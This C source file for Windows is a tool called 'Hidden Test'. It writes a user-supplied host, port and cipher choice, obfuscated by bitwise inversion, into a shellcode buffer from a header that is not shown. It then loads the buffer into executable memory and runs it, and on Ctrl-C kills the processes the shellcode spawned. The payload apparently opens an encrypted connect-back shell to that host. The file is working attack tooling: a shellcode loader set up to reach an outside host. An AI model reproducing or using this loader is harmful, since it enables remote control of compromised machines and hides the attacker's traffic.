/**
 *   Hidden Test v0.1
 *   Copyright (C) 2014 Kevin Devine @cmpxchg8
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <ws2tcpip.h>
#include <winsock2.h>

#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>
#include <stdint.h>

#define APP_NAME     "Hidden Test"
#define APP_VERSION  "0.1"
#define AUTHOR_EMAIL "Kevin Devine @cmpxchg8"

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

#include "hidden.h"

struct sockaddr_in sin_ipv4;
int ai_addrlen;
struct sockaddr *ai_addr;
char ip[64];

BOOL WINAPI HandlerRoutine (DWORD dwCtrlType)
{
  if (dwCtrlType != CTRL_C_EVENT) return FALSE;

  HANDLE hSnap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  
  if (hSnap != INVALID_HANDLE_VALUE) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof (PROCESSENTRY32);
    
    BOOL bResult = Process32First (hSnap, &pe32);
    while (bResult) 
    {
      if (pe32.th32ParentProcessID==GetCurrentProcessId()) {
        HANDLE hProcess=OpenProcess (PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
        if (hProcess!=NULL)
        {
          TerminateProcess (hProcess, 0);
          CloseHandle (hProcess);
        } else {
          printf ("[ Warning: Unable to terminate \"%s\" with process id %i", 
            pe32.szExeFile, pe32.th32ProcessID);
        }
      }
      bResult = Process32Next (hSnap, &pe32);
    }
    CloseHandle (hSnap);
  }
  return TRUE;
}

void start_handler (void)
{
  SetConsoleCtrlHandler (HandlerRoutine, TRUE);
}

void stop_handler (void)
{
  SetConsoleCtrlHandler (HandlerRoutine, FALSE);
}

char *addr2ip (void)
{
  DWORD ip_size=64;
  WSAAddressToString (ai_addr, ai_addrlen, NULL, (char*)ip, &ip_size);
  return (char*)ip;
}

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
bool resolvex (char host[], char port[])
{
  struct addrinfo *list;
  struct addrinfo hints;
  BOOL bStatus=FALSE;
  
  ZeroMemory (&hints, sizeof (hints));

  hints.ai_family   = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  
  // get all resolvable addresses for this machine name
  if (getaddrinfo (host, port, &hints, &list) == 0) 
  {
    for (struct addrinfo *pEntry=list; pEntry!=NULL; pEntry=pEntry->ai_next) 
    {
      memcpy (&sin_ipv4, pEntry->ai_addr, pEntry->ai_addrlen);
      ai_addr = (sockaddr*)&sin_ipv4;        
      ai_addrlen = pEntry->ai_addrlen;
      bStatus=TRUE;
      break;
    }
    freeaddrinfo (list);
  }
  return bStatus;
}

/**
 * Function to handle incoming connections
 *
 */
void usage (char *argv[]) 
{  
  printf ("\n  Usage: ht <host> <port> [options]\n");
  printf ("\n  -e   0=rc2, 1=rc4, 2=des, 3=3des");
  printf ("\n       4=aes-128, 5=aes-192, 6=aes-256 (default)\n");
  printf ("\n  Example: ht localhost 80 -e 3\n");
  
  printf ("\n  Press any key to continue . . .");
  fgetc (stdin);
  exit (0);
}

VOID ConsoleSetBufferWidth (SHORT X) {
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  GetConsoleScreenBufferInfo (GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
  
  if (X <= csbi.dwSize.X) return;
  csbi.dwSize.X = X;
  SetConsoleScreenBufferSize (GetStdHandle(STD_OUTPUT_HANDLE), csbi.dwSize);
}

int main (int argc, char* argv[]) {
  uint8_t   *p;
  short     remote_port;
  in_addr_t remote_ip;
  
  char    *host=NULL, *port="80";   // default is 80
  int     i, n, bitlen=1024;        // default is 1024-bit
  char    opt;
  WSADATA wsa;
  DWORD   algid=6;                  // default is AES-256

  ConsoleSetBufferWidth (300);
  
  puts ("\n  "APP_NAME" component "APP_VERSION
       "\n  Copyright (c) 2014 "AUTHOR_EMAIL"\n");
       
  for (i=1; i<argc; i++) {
    if (argv[i][0]=='/' || argv[i][0]=='-') {
      opt=argv[i][1];
      switch (opt) {
        case 'e' :
        {
          if ((i+1) <= argc) {
            algid=atoi(argv[++i]);
            if (algid <0 || algid>6) {
              printf ("\nInvalid algorithm: valid values are 0-6");
              exit (0);
            }
          } else {
            printf ("\n-e requires parameter");
            exit (0);
          }
          break;
        }
        case '?' :
        case 'h' :
        default  : { usage (argv); break; }
      }
    } else {
      // if value is within port range, save it
      n=strlen(argv[i]);
      if (n>0&&n<5) {
        n=atoi(argv[i]);
        if (n>0&&n<65535) { port=argv[i]; continue; }
      }
      // assume it's hostname or ip
      host=argv[i];
    }
  }
  
  if (host==NULL) {
    usage (argv);
  }
  // required for shellcode to run
  LoadLibrary ("advapi32");
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  if (resolvex (host, port)) {
    printf ("[ Connecting to %s . . . \n", addr2ip ());
    // set remote ip
    p=(uint8_t*)&hidden[IP_ADDRESS];
    remote_ip=~sin_ipv4.sin_addr.s_addr;
    memcpy (p, &remote_ip, sizeof (remote_ip));
  
    // set remote port
    p=(uint8_t*)&hidden[PORT+2];
    remote_port=~htons (atoi(port));
    memcpy (p, &remote_port, sizeof (remote_port));
    
    // set crypto algorithm
    switch (algid)
    {
      case 0:
        algid=CALG_RC2;
        break;
      case 1:
        algid=CALG_RC4;
        break;
      case 2:
        algid=CALG_DES;
        break;
      case 3:
        algid=CALG_3DES;
        break;
      case 4:
        algid=CALG_AES_128;
        break;
      case 5:
        algid=CALG_AES_192;
        break;
      case 6:
        algid=CALG_AES_256;
        break;
    }
    algid=~algid;

    p=(uint8_t*)&hidden[CRYPT_ALG];
    memcpy (p, &algid, sizeof (algid));
    
    void *exec = VirtualAlloc(0, strlen (hidden), 
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy (exec, hidden, strlen (hidden));
    printf ("[ Executing code . . . \n");
    start_handler ();
    //DebugBreak();
    ((void(*)())exec)();
    printf ("[ Exiting code . . . \n");
    VirtualFree (exec, 0, MEM_RELEASE);
  } else {
    printf ("[ Unable to resolve address for %s\n", host);
  }
  WSACleanup();
  return 0;
}

